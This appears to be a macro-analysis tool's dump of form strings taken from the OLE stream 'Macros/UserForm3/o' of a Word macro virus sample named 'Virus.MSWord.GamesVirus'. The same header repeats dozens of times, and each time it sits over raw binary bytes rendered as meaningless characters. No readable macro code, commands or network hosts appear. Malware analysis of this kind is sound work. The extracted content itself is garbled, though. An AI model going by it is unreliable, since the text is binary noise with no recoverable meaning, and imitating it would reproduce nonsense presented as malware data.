VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z��Ϳ��ν����¿�ΰ��������ɿҿ��ɿ��Ŧ���������ӧq�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��楧Zyyoqq��qut�����慅WW�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FQZ���M��tt��o����ͧ�u���������������t�tt�������������qut�������������������q�����t�qoq���o����o�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�tW}o���qqo����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�uWWtMutWVBB+LLPPII=2SIFPPk������д�����ǰ������������ǿ����ǫ�ο�ǿ��ǿ�QZtZq��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������涆�SNYoMMKKM����Fq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�qq�y����������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����u��u��u�����uo������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o���������ӌ~���sd~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���W���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�MtMtMWWMW3+LL5KG+PLK+3++BB)9^c[J=<]=R^���ɽ�ѿ��ɯ���ο����ڿ����ǿ�μzYQKQYZWty�������ͳ��tt��MEJ<SZ�EKUq����Wq�tW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��t������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
煙�����������u��t��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ե�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y�ԥ���}y�����q����ooq�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�WWtWWWWMFF/)+LNKKGGG5AA5GKKNO<<<666=;JKj������������ǡnU���ǫ������dHNaUZL+LYLNOJJ6<=H+NHQ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5;<KWtMUMt�E�Fot�IW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��t������������������������������qq�o�uu��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��慸����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���o�q�ttqoqqq�yt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�WMMMWtWWMP3PI+55NOJJ<=<JKLLLKO;===66=<JKKN<<66==666===6=<==Hs����ǿf=O=SZ/++KQNNO<<O66==NKQm����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
PZPtZEyW�MI+My��3KM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��tt�����ﳳ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������~��������������q��tu�t������o�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������������������u���e�}�q�Ӆ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tMWW3W33F3PImZZLGG<<<<==<SJSGNSOO======O<;;<==6=6=6===6=66===6=Rwc666<=HOQVmLSLYKNHN<=66=OOU/���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���UB3t/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(9B/����oy�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������鳳����������������������}eq��q���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��a�y��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u��EM�MWWtttFqFBII5KAPVUIFFm(BZPWFP3P(6NLNG9J*;L59GK5G5L5+L5+LLLLK.ALQLZ/tVWVSBPBPm3I+L+VqWu��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
鷶�+I+tFL+m��慷qq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�tt��������酅�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������q���������u������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ೝ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������t������t���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�WttWEtPEMEt�ZMPM53NIVPPYBFIN(ZF/FWLZF(HUBYBU+NKULKNNNSNSQ�YGGQ/�VNKKQKByoVVmWYVPmB+LVB++9FBy��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�WZM�ymot��糳�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����t�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��t��u��������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������t������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tM�ttMt3WWE�muWM3PFUIVLVI+FYVWmFPPFVIqt����W����M��ZQ�]Qd���km
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��w�s���w�K;BVn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
PFBBBZI/IILm3����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�mq������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�鳳����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�����w�����t���������u���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��q�p���a��������q������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����tt�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tWtEtMtP��MVtWM/F3PUPIINPISFI(mFBFWPPVM����W����Mf����PZ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M����Ys���nV�/QZnrqq/KP/B/BYQIPoq��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�Wu�yu������೶�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������鶓����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������o������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n�w~����~�w��o����u���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w������������}�����W��u������������t������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�WtttEEMtttMMMWWPPV)PIIBIPPPPWFW3FWFPFW�[OTS�qPBVd����Mg�aZ�z/�BQ�vs�IQIPQtMPn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/PmUWqZ**+L3/o��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t�Zuum������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����鳳���������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����s��n�w��������f�m�yu�q����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W����������������aa��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����n��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�WEMM�EMMMWMMMWWq3PVVPVVIPPPPWWWMMWWMME�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N=O�otMLR�uf�mdf3l��Z�W/�dl�qtEUWt/qd`m/mmo3/P/+Vmo���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����EM��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��t�������������������~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������������o�eq�q�a��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��qt��y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ӵ�q�j���}�����nt�W����������W���t����t�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�MFFFP3PPPPMMPPP/I(+LIA5LK5BZLLL++B/+Zo�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:=O���\XS�o�nHcfPifba�3Yfcd���WSBEEPc`WEF3PPPFWquq���������t��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
鳵���������������`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����q�W�W��������������vq���Zu�z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���s��o����q���t��d���vn���w`��qq�qt��tt�t������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�uPIVmmBLBEMMM++ZBL5LFNNONVVF+UKKQQZQQZ�g:=H���c[Mnz�[<c�3O/VD�MZ�cv��fGN+Wt��lWuWWWWPquq�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������鳳
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z�������n�q�}����nw~��o���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���j����v�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������l���W����ttt����t���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�uP3qqPMMZM)PIB+B*L+II+INA55L+KUM5K555B�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
NGL�o�tA6\��IHT��u�mr�3K�cd�q��mA+E��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M�tWtPmW�W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������������o�o��y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��w�����t�sn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����tuu�a��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���n��ss�v���a/�m��ә���s�t�W�ttt�t���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�WMWWtMV3M/MFVLQL3/3L+5(NN+BIKVFLLLQLKQ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<=K����KCT�fG=O����PH�FU�dv���\A=<5P\`VVm3BPPyt���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t��VVt����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��q������}��������so����u�}�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l���~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm3/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����u��
